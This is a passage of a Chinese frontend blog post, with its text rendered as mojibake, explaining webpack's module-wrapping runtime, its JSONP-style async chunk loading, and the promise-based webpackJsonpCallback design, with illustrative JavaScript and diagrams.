                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">èƒŒæ™¯ï¼š</h2>
<p>è¿™å‡ å¤©é‡æ–°æ¢³ç†äº†ä¸€ä¸‹ webpackå¼‚æ­¥åŠ è½½çš„åŸç†ï¼Œå¹¶å¯¹å®ç°ç»†èŠ‚è¿›è¡Œäº†ä¸€ç•ªæ‹†è§£ï¼Œå†æ¬¡è®©æˆ‘æ„Ÿå¹ï¼šçœŸæ˜¯ä¸‡å˜ä¸ç¦»å…¶å®—ï¼ŒåŸºç¡€çŸ¥è¯†çœŸçš„æ˜¯æ„å»ºä¸Šå±‚å»ºç­‘çš„åšå®åº•åº§ï¼Œåœ¨æ­¤ä¹Ÿåˆ†äº«ç»™å¤§å®¶ï¼Œå¸Œæœ›å¤§å®¶å¯ä»¥é¢†ç•¥åˆ°webpackå®ç°å¼‚æ­¥åŠ è½½ä¹‹ç¾</p>
<h2 data-id="heading-1">åŸºåº§ä¸€ï¼šwebpackæ¨¡å—åŒ–æ–¹æ¡ˆ</h2>
<h3 data-id="heading-2">ä½ å¯èƒ½ä¹Ÿåæ§½è¿‡ webpackäº§ç‰©ä¸ºå•¥è¿™ä¹ˆä¸‘ï¼Ÿ</h3>
<h4 data-id="heading-3">åŸå§‹æºä»£ç </h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// src/index.js (å…¥å£æ–‡ä»¶)</span>
<span class="hljs-keyword">let</span> title = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./title.js'</span>)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(title);
<span class="hljs-comment">// src/title.js</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-string">'bu'</span>;
</code></pre>
<h4 data-id="heading-4">æ„å»ºåäº§ç‰©ç»“æ„æ¦‚è§ˆ</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/******/</span> (<span class="hljs-function">() =&gt;</span> { <span class="hljs-comment">// webpack bootstrap å¯åŠ¨å‡½æ•°</span>
<span class="hljs-comment">/******/</span> 	<span class="hljs-keyword">var</span> __webpack_modules__ = ([
<span class="hljs-comment">/* 0 */</span> <span class="hljs-comment">/* title.js æ¨¡å— */</span>
(<span class="hljs-function">(<span class="hljs-params"><span class="hljs-variable language_">module</span></span>) =&gt;</span> {
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-string">'bu'</span>;
}),
<span class="hljs-comment">/* 1 */</span> <span class="hljs-comment">/* index.js æ¨¡å— */</span>
(<span class="hljs-function">(<span class="hljs-params">__unused_webpack_module, __unused_webpack_exports, __webpack_require__</span>) =&gt;</span> {
<span class="hljs-keyword">let</span> title = <span class="hljs-title function_">__webpack_require__</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// åŠ è½½æ¨¡å—0</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(title);
})
<span class="hljs-comment">/******/</span> 	]);
<span class="hljs-comment">/******/</span> 	<span class="hljs-comment">/* æ¨¡å—ç¼“å­˜ */</span>
<span class="hljs-comment">/******/</span> 	<span class="hljs-keyword">var</span> __webpack_module_cache__ = {};
<span class="hljs-comment">/******/</span> 	<span class="hljs-comment">/* Webpack è‡ªå®ç°çš„ require å‡½æ•° */</span>
<span class="hljs-comment">/******/</span> 	<span class="hljs-keyword">function</span> <span class="hljs-title function_">__webpack_require__</span>(<span class="hljs-params">moduleId</span>) {
<span class="hljs-comment">/******/</span> 		<span class="hljs-comment">/* æ£€æŸ¥ç¼“å­˜ */</span>
<span class="hljs-comment">/******/</span> 		<span class="hljs-keyword">var</span> cachedModule = __webpack_module_cache__[moduleId];
<span class="hljs-comment">/******/</span> 		<span class="hljs-keyword">if</span> (cachedModule !== <span class="hljs-literal">undefined</span>) {
<span class="hljs-comment">/******/</span> 			<span class="hljs-keyword">return</span> cachedModule.<span class="hljs-property">exports</span>;
<span class="hljs-comment">/******/</span> 		}
<span class="hljs-comment">/******/</span> 		<span class="hljs-comment">/* åˆ›å»ºæ–°æ¨¡å—å¹¶åŠ å…¥ç¼“å­˜ */</span>
<span class="hljs-comment">/******/</span> 		<span class="hljs-keyword">var</span> <span class="hljs-variable language_">module</span> = __webpack_module_cache__[moduleId] = {
<span class="hljs-comment">/******/</span> 			<span class="hljs-attr">exports</span>: {}
<span class="hljs-comment">/******/</span> 		};
<span class="hljs-comment">/******/</span> 		<span class="hljs-comment">/* æ‰§è¡Œæ¨¡å—å‡½æ•° */</span>
<span class="hljs-comment">/******/</span> 		__webpack_modules__[moduleId](<span class="hljs-variable language_">module</span>, <span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>, __webpack_require__);
<span class="hljs-comment">/******/</span> 		<span class="hljs-comment">/* è¿”å›æ¨¡å—çš„ exports å¯¹è±¡ */</span>
<span class="hljs-comment">/******/</span> 		<span class="hljs-keyword">return</span> <span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>;
<span class="hljs-comment">/******/</span> 	}
<span class="hljs-comment">/******/</span> 	<span class="hljs-comment">/* å¯åŠ¨å…¥å£æ¨¡å— */</span>
<span class="hljs-comment">/******/</span> 	<span class="hljs-keyword">return</span> <span class="hljs-title function_">__webpack_require__</span>(<span class="hljs-number">1</span>); <span class="hljs-comment">// åŠ è½½å…¥å£æ¨¡å—(index.js)</span>
<span class="hljs-comment">/******/</span> })()
;
</code></pre>
<h3 data-id="heading-5">âœ… æ ¸å¿ƒåŸå› ï¼šè§„èŒƒè½¬æ¢æˆæœ¬ï¼ˆæ¨¡å—ç³»ç»Ÿé€‚é…ï¼‰</h3>
<p><strong>æµè§ˆå™¨åŸç”Ÿä¸æ”¯æŒæ¨¡å—è§„èŒƒ</strong><br/>
æµè§ˆå™¨æ— æ³•ç›´æ¥æ‰§è¡Œ CommonJS/AMP/UMD æ¨¡å—è¯­æ³•ï¼ˆå¦‚Â <code>require()</code>Â /Â <code>module.exports</code>Â /Â <code>define()</code>ï¼‰ã€‚Webpack å¿…é¡»å°†è¿™äº›è§„èŒƒ<strong>ç»Ÿä¸€è½¬æ¢ä¸ºæµè§ˆå™¨å¯æ‰§è¡Œçš„å‡½æ•°åŒ…è£…å½¢å¼</strong>ã€‚</p>
<ul>
<li>
<p><strong>æ•´ä¸ªæ‰“åŒ…äº§ç‰©</strong>è¢«åŒ…è£¹åœ¨ä¸€ä¸ª<strong>å¤–å±‚ IIFE</strong>Â ä¸­ï¼ˆç«‹å³æ‰§è¡Œï¼‰</p>
<ul>
<li><strong>æ„ä¹‰</strong>ï¼šåˆ›å»ºç‹¬ç«‹ä½œç”¨åŸŸ</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"> <span class="hljs-comment">// æœªåŒ…è£¹ï¼šå˜é‡æš´éœ²å…¨å±€</span>
<span class="hljs-keyword">var</span> utils = {...} <span class="hljs-comment">// å¯èƒ½è¦†ç›–å…¶ä»–è„šæœ¬çš„åŒåå˜é‡</span>

<span class="hljs-comment">// IIFE åŒ…è£¹åï¼š</span>
(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">var</span> utils = {...} <span class="hljs-comment">// å®‰å…¨éš”ç¦»</span>
})();
</code></pre>
</li>
<li>
<p><strong>æ¯ä¸ªæ¨¡å—</strong>è¢«è½¬æ¢ä¸º<strong>æ ‡å‡†å‡½æ•°</strong>ï¼ˆéç«‹å³æ‰§è¡Œï¼‰ï¼Œä½œä¸ºå‚æ•°ä¼ é€’ç»™è¿è¡Œæ—¶ï¼šfunction(module, exports...)</p>
<ul>
<li><strong>æ„ä¹‰</strong>ï¼š<strong>æ¨¡å—ç¯å¢ƒéš”ç¦»</strong> -æ¯æ¬¡è°ƒç”¨æ¨¡å—å‡½æ•°æ—¶éƒ½ä¼šåˆ›å»ºæ–°çš„ï¼š</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = { <span class="hljs-attr">exports</span>: {} };
modules[moduleId].<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>, ...);
</code></pre>
</li>
<li>
<p>æ¨¡å—è·¯å¾„è¢«æ›¿æ¢ä¸ºÂ <strong>æ•°å­— ID</strong></p>
<ul>
<li>æå‡æ€§èƒ½ &amp; å‡å°‘ä½“ç§¯
<ul>
<li>âœ…Â <strong>å¤§å¹…ç¼©çŸ­å¼•ç”¨è·¯å¾„</strong>ï¼š<br/>
<code>'./src/utils/string-format.js'</code>Â â†’Â <code>__webpack_require__(17)</code></li>
<li>âœ…Â <strong>é¿å…è·¯å¾„è§£æå¼€é”€</strong>ï¼šæµè§ˆå™¨æ— éœ€å¤„ç†æ–‡ä»¶è·¯å¾„é€»è¾‘</li>
</ul>
</li>
</ul>
</li>
<li>
<p>åŸç”ŸÂ <code>require/module</code>Â è¢«æ›¿æ¢ä¸º Webpack è‡ªå®ç°çš„Â  <strong><code>__webpack_require__</code></strong> Â å‡½æ•°</p>
<ul>
<li><strong>è§„èŒƒç»Ÿä¸€</strong>ï¼šå°† ESM/CommonJS/AMD è½¬ä¸ºæµè§ˆå™¨å¯æ‰§è¡Œæ ¼å¼</li>
</ul>
</li>
<li>
<p>ç”Ÿæˆå¤æ‚çš„Â <strong>è¿è¡Œæ—¶(runtime)ä»£ç </strong>Â å¤„ç†æ¨¡å—åŠ è½½/ç¼“å­˜</p>
<ul>
<li>é¿å…é‡å¤æ‰§è¡Œï¼ˆå¦‚å¤šæ¬¡Â <code>require</code>Â åŒä¸€æ¨¡å—ï¼‰</li>
</ul>
</li>
<li>
<p>æ¨¡å—å­—å…¸ï¼ˆæ‰€æœ‰ä»£ç è¢«æ‰“åŒ…æˆé”®å€¼å¯¹ï¼ˆé”®ï¼šä¸Šé¢æåˆ°çš„æ•°å­—IDï¼Œå€¼ï¼šä¸Šé¢æåˆ°çš„<strong>æ¯ä¸ªæ¨¡å—</strong>è¢«è½¬æ¢çš„<strong>æ ‡å‡†å‡½æ•°</strong>ï¼‰ï¼‰</p>
<ul>
<li>âœ…Â <strong>å¿«é€Ÿç´¢å¼•</strong>ï¼šé€šè¿‡æ•°å­— ID å®ç° O(1) å¤æ‚åº¦çš„æ¨¡å—æŸ¥æ‰¾</li>
</ul>
</li>
</ul>
<h2 data-id="heading-6">åŸºåº§äºŒï¼šjsonp</h2>
<p>ä¼ ç»Ÿçš„ JSONP æµç¨‹ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">
sequenceDiagram

participant Client as å®¢æˆ·ç«¯

participant Server as æœåŠ¡å™¨

Client-&gt;&gt;Client: åˆ›å»ºå›è°ƒå‡½æ•°

Note right of Client: window.myCallback = &lt;br/&gt;function(data){...}

Client-&gt;&gt;Server: åŠ¨æ€åˆ›å»º&lt;script src="api?callback=myCallback"&gt;

Server-&gt;&gt;Server: å‡†å¤‡æ•°æ®

Server-&gt;&gt;Client: è¿”å› myCallback({...æ•°æ®...})

Client-&gt;&gt;Client: æ‰§è¡Œå›è°ƒå‡½æ•°

</code></pre>
<p>Webpack å¼‚æ­¥åŠ è½½æœºåˆ¶ä¸ JSONP çš„å¯¹æ¯”</p>
<ol>
<li><strong>è„šæœ¬åŠ è½½æœºåˆ¶ç›¸åŒ</strong>ï¼š</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript">
<span class="hljs-comment">// ä¸¤è€…éƒ½ä½¿ç”¨ç›¸åŒçš„åŸºç¡€åŠ è½½æ–¹å¼</span>

<span class="hljs-keyword">const</span> script = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'script'</span>);

script.<span class="hljs-property">src</span> = <span class="hljs-string">'resource.js'</span>;

<span class="hljs-variable language_">document</span>.<span class="hljs-property">head</span>.<span class="hljs-title function_">appendChild</span>(script);

</code></pre>
<ol start="2">
<li><strong>å…¨å±€å›è°ƒè®¾è®¡</strong>ï¼š</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript">
<span class="hljs-comment">// JSONP</span>

<span class="hljs-variable language_">window</span>.<span class="hljs-property">jsonpCallback</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) { ... }

<span class="hljs-comment">// Webpack</span>

<span class="hljs-variable language_">window</span>.<span class="hljs-property">webpackJsonp</span> = [];

<span class="hljs-variable language_">window</span>.<span class="hljs-property">webpackJsonp</span>.<span class="hljs-property">push</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) { ... }

</code></pre>
<ol start="3">
<li><strong>æ‰§è¡Œæµç¨‹ç›¸ä¼¼</strong>ï¼š</li>
</ol>
<pre><code class="hljs language-mermaid" lang="mermaid">
graph TD

A[åˆ›å»º script æ ‡ç­¾] --&gt; B[è®¾ç½® src]

B --&gt; C[æ·»åŠ åˆ° DOM]

C --&gt; D[æœåŠ¡å™¨è¿”å› JS]

D --&gt; E[æ‰§è¡Œ JS ä»£ç ]

E --&gt; F[è§¦å‘å…¨å±€å›è°ƒ]

</code></pre>
<p>é‚£ä¹ˆä¸ä¸€æ ·çš„åœ°æ–¹åœ¨å“ªå‘¢ï¼Ÿ</p>
<p>å¯¹äº†å°±æ˜¯å…¨å±€å›è°ƒï¼Œå¼‚æ­¥åŠ è½½çš„å›è°ƒå‡½æ•°è®¾è®¡æ˜¯éå¸¸ç²¾å¦™çš„ï¼Œå’±ä»¬å¾€ä¸‹çœ‹</p>
<h2 data-id="heading-7">ç²¾å¦™çš„å…¨å±€å›è°ƒè®¾è®¡-webpackJsonpCallback</h2>
<p>å¥½äº†ï¼Œç°åœ¨æˆ‘ä»¬æ‹¿åˆ°å¼‚æ­¥ç»„ä»¶è„šæœ¬äº†ï¼Œæˆ‘ä»¬åº”è¯¥åšä»€ä¹ˆå‘¢ï¼Ÿ</p>
<p><code>å¯¹äº†ï¼Œå°±æ˜¯è¦æ¥å…¥ æˆ‘ä»¬ä¸Šé¢èŠçš„ webpackæ¨¡å—åŒ–æ–¹æ¡ˆï¼Œåªæœ‰è¿™æ ·webpack æ‰èƒ½æ­£å¸¸åŠ è½½å¹¶ç¼“å­˜æˆ‘ä»¬çš„å¼‚æ­¥æ¨¡å—</code></p>
<p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæ€æ ·æ‰èƒ½å’Œä¸Šé¢è¯´çš„ webpackæ¨¡å—åŒ–æ–¹æ¡ˆ æ¥ä¸Šè½¨å‘¢ï¼Ÿ</p>
<p><code>ç­”æ¡ˆå°±åœ¨ è¿™ä¸ªjsonpçš„å…¨å±€å›è°ƒä¸Š</code></p>
<p>æ˜¾ç„¶æˆ‘ä»¬è¦åœ¨å›è°ƒé‡Œ æŠŠå½“å‰æ¨¡å—åŠ å…¥åˆ° æ¨¡å—å­—å…¸é‡Œï¼ŒåŠ <strong>webpack_modules</strong> é‡Œï¼Œ</p>
<p><code>æˆ‘ä»¬ç®¡è¿™ä¸€æ­¥ï¼Œå«åš å…¨å±€æ¨¡å—æ³¨å†Œï¼Œæ³¨æ„è¿™é‡Œä»…ä»…æ˜¯æ³¨å†Œæ¨¡å—ï¼Œå¹¶æ²¡æœ‰æ‰§è¡Œæ¨¡å—</code></p>
<h3 data-id="heading-8">æŒ‰éœ€æ‰§è¡Œ å¦‚ä½•åšåˆ°</h3>
<p>å¥½äº†ï¼Œæ³¨å†Œæ¨¡å—æˆ‘ä»¬å®ç°äº†ï¼Œé‚£ä¹ˆæŒ‰éœ€æ‰§è¡Œå‘¢ï¼Ÿ</p>
<p>æŒ‰éœ€æ‰§è¡Œï¼Œå³æˆ‘ä»¬å¸Œæœ›ç”±æˆ‘ä»¬æ¥æ§åˆ¶ ä»€ä¹ˆæ—¶å€™æ‰§è¡Œè¯¥æ¨¡å—ï¼Œé‚£ä¹ˆå¦‚ä½•å®ç°å‘¢ï¼Ÿ</p>
<h3 data-id="heading-9">ç²¾å¦™è®¾è®¡ä¸€ï¼šåŠ è½½æ¨¡å—å’Œæ‰§è¡Œæ¨¡å—åˆ†ç¦»--è§£è€¦è¯·æ±‚ä¸å“åº”</h3>
<h3 data-id="heading-10"/>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
A[å‘èµ·è¯·æ±‚] --&gt; B[å­˜å‚¨æ§åˆ¶å™¨]
C[å“åº”åˆ°è¾¾] --&gt; D[å–å‡ºæ§åˆ¶å™¨]
D --&gt; E[è§¦å‘å›è°ƒ]


</code></pre>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ­¥éª¤1: åˆå§‹åŒ–Promise</span>
<span class="hljs-keyword">const</span> promise = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
  <span class="hljs-comment">// è¿™ä¸ªå›è°ƒä¼šç«‹å³æ‰§è¡Œï¼</span>
  installedChunks[chunkId] = [[resolve, reject]];
});

<span class="hljs-comment">// æ­¥éª¤2: æ–‡ä»¶åŠ è½½å®Œæˆå</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">chunkLoaded</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> callbacks = installedChunks[chunkId];
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [res] <span class="hljs-keyword">of</span> callbacks) {
    <span class="hljs-title function_">res</span>(); <span class="hljs-comment">// æ‰‹åŠ¨è§¦å‘æ‰€æœ‰resolve</span>
  }
  installedChunks[chunkId] = <span class="hljs-number">0</span>; <span class="hljs-comment">// æ ‡è®°ä¸ºå·²åŠ è½½</span>
}

<span class="hljs-comment">// æ­¥éª¤3: è§¦å‘.then()</span>
promise.<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// è¿™é‡Œæ‰ä¼šæ‰§è¡Œï¼</span>
  <span class="hljs-title function_">__webpack_require__</span>(moduleId);
});
</code></pre>
<p>ä¹Ÿå°±æ˜¯è¯´åœ¨å¼‚æ­¥åŠ è½½æ¨¡å—æµç¨‹ä¼šå°è£…æˆä¸€ä¸ªpromiseï¼Œ
åœ¨åŠ è½½æ¨¡å—å‰ï¼Œæˆ‘ä»¬ä¼šæå‰å°†è¯¥promiseçš„resolveå›è°ƒå­˜å‚¨èµ·æ¥ï¼Œå­˜åˆ° installedChunksï¼›</p>
<p>å½“åŠ è½½æ¨¡å—è¯·æ±‚å“åº”å›æ¥ä¹‹åï¼Œæˆ‘ä»¬ä» installedChunksé‡Œæ‹¿åˆ° resolve å›è°ƒæ‰§è¡Œ
æˆ‘ä»¬å¯ä»¥åœ¨resolve é‡Œé¢æ§åˆ¶ä½•æ—¶ æ‰§è¡Œæ¨¡å—</p>
<pre><code class="hljs language-mermaid" lang="mermaid">
sequenceDiagram

participant T as .then()è°ƒç”¨

participant R as Runtime(è¿è¡Œæ—¶)

participant S as ç½‘ç»œè¯·æ±‚

T-&gt;&gt;R: __webpack_require__.e("hello_chunk")

activate R

R-&gt;&gt;R: åˆ›å»ºPromise&lt;br&gt;installedChunks["hello_chunk"] = [[resolve, reject]]

R-&gt;&gt;S: å‘èµ·chunkåŠ è½½è¯·æ±‚

deactivate R

S--&gt;&gt;R: è¿”å›chunkå†…å®¹

activate R

R-&gt;&gt;R: æ‰§è¡ŒwebpackJsonpCallback

R-&gt;&gt;R: æ‰¾åˆ°å¯¹åº”resolveå‡½æ•°

R-&gt;&gt;Promise: æ‰§è¡Œresolve()

deactivate R

Promise--&gt;&gt;T: è§¦å‘.then()å›è°ƒ

</code></pre>
<p>åˆ°è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç»™å‡º__webpack_require__.e å’Œ webpackJsonpCallbackçš„ä»£ç äº†ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å¼‚æ­¥åŠ è½½å‡½æ•° (ä¿®æ­£ç‰ˆ)</span>
  __webpack_require__.<span class="hljs-property">e</span> = <span class="hljs-function">(<span class="hljs-params">chunkId</span>) =&gt;</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
      <span class="hljs-comment">// æ£€æŸ¥æ¨¡å—æ˜¯å¦å·²åŠ è½½</span>
      <span class="hljs-keyword">if</span> (installedChunks[chunkId] === <span class="hljs-number">0</span>) {
        <span class="hljs-title function_">resolve</span>();
        <span class="hljs-keyword">return</span>;
      }
      
      <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦å·²åœ¨åŠ è½½ä¸­</span>
      <span class="hljs-keyword">if</span> (installedChunks[chunkId]) {
        installedChunks[chunkId].<span class="hljs-title function_">push</span>([resolve, reject]);
        <span class="hljs-keyword">return</span>;
      }
      
      <span class="hljs-comment">// åˆå§‹åŒ–åŠ è½½çŠ¶æ€</span>
      installedChunks[chunkId] = [[resolve, reject]];
      
      <span class="hljs-comment">// åˆ›å»ºè„šæœ¬æ ‡ç­¾åŠ è½½ chunk</span>
      <span class="hljs-keyword">const</span> script = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'script'</span>);
      script.<span class="hljs-property">src</span> = <span class="hljs-string">`<span class="hljs-subst">${chunkId}</span>.js`</span>;
      script.<span class="hljs-property">onerror</span> = <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`Failed to load chunk <span class="hljs-subst">${chunkId}</span>`</span>));
        <span class="hljs-comment">// æ¸…ç†åŠ è½½çŠ¶æ€</span>
        <span class="hljs-keyword">if</span> (installedChunks[chunkId]) {
          installedChunks[chunkId] = <span class="hljs-literal">undefined</span>;
        }
      };
      
      <span class="hljs-comment">// å…³é”®æ­¥éª¤ï¼šå°†è„šæœ¬æ·»åŠ åˆ°æ–‡æ¡£å¤´éƒ¨ (ä¹‹å‰é—æ¼çš„éƒ¨åˆ†)</span>
      <span class="hljs-variable language_">document</span>.<span class="hljs-property">head</span>.<span class="hljs-title function_">appendChild</span>(script);
    });
  };
  
<span class="hljs-keyword">function</span> <span class="hljs-title function_">webpackJsonpCallback</span>(<span class="hljs-params">data</span>) {
    <span class="hljs-keyword">const</span> [chunkIds, moreModules] = data;
    
    <span class="hljs-comment">// æ³¨å†Œæ–°æ¨¡å—</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> moduleId <span class="hljs-keyword">in</span> moreModules) {
      __webpack_modules__[moduleId] = moreModules[moduleId];
    }
    
    <span class="hljs-comment">// å¤„ç†æ¯ä¸ª chunk çš„ Promise</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> chunkId <span class="hljs-keyword">of</span> chunkIds) {
      <span class="hljs-keyword">const</span> chunkState = installedChunks[chunkId];
      <span class="hljs-keyword">if</span> (!chunkState) <span class="hljs-keyword">continue</span>;
      
      <span class="hljs-comment">// æ‰§è¡Œæ‰€æœ‰ resolve å›è°ƒ</span>
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [resolve] <span class="hljs-keyword">of</span> chunkState) {
        <span class="hljs-title function_">resolve</span>();
      }
      
      <span class="hljs-comment">// æ ‡è®° chunk ä¸ºå·²åŠ è½½</span>
      installedChunks[chunkId] = <span class="hljs-number">0</span>;
    }
  }
</code></pre>
<p>æ˜¯ä¸æ˜¯å¾ˆæ£’ï¼ŒåŠ è½½ç”±æˆ‘ä»¬æ§åˆ¶ï¼Œæ‰§è¡Œä¹Ÿç”±æˆ‘ä»¬æ§åˆ¶ï¼Œ</p>
<h3 data-id="heading-11">ç²¾å¦™è®¾è®¡äºŒï¼šåŠ è½½æ—¶åºé—®é¢˜è§£å†³æ–¹æ¡ˆ</h3>
<p>å½“æˆ‘ä»¬åŠ è½½å¼‚æ­¥ç»„ä»¶åï¼Œæˆ‘ä»¬å‘ç°å®ƒå¹¶ä¸æ˜¯ç”¨  webpackJsonpCallback åŒ…è£¹èµ·æ¥,è€Œæ˜¯ç”¨ webpackJsonp.push</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// hello_chunk.js</span>
webpackJsonp.<span class="hljs-title function_">push</span>([[<span class="hljs-string">"hello_chunk"</span>], {<span class="hljs-string">"./src/hello.js"</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>){...}}])
</code></pre>
<p>åœ¨webpack å®ç°é‡Œæˆ‘ä»¬ä¼šçœ‹åˆ°è¿™å¥è¯ï¼š</p>
<p><code>webpackJsonp.push = webpackJsonpCallback;</code></p>
